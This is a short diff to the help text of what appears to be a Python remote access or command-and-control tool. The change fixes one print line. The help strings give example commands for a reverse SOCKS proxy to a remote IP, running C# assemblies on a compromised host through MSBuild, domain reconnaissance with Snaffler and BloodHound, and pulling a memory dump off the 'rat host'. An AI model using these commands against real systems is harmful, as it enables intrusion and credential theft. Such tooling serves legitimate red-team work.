@@ -356,7 +356,7 @@ def get_help():
     print("example: psh script/Invoke-SocksProxy.ps1 Invoke-ReverseSocksProxy -remotePort 4444 -remoteHost 12.23.34.45")
     print("cs <local_c_sharp_exe_path> <command_arguments> -- Runs the assembly on the remote host using MSBuild.exe and a C Sharp reflective loader stub")
     print("example: cs scripts/Snaffler.exe --domain borgar.local --stdout")
-    print("up/upload -- Uploads file from C2 server to rat host"/)
+    print("up/upload -- Uploads file from C2 server to rat host")
     print("example: upload scripts/Invoke-Bloodhound.ps1 C:\users\localadmin\desktop\ibh.ps1"
     print("dl/download -- downloads the specified file from the rat host")
     print("example: download C:\users\localadmin\desktop\minidump_660.dmp")
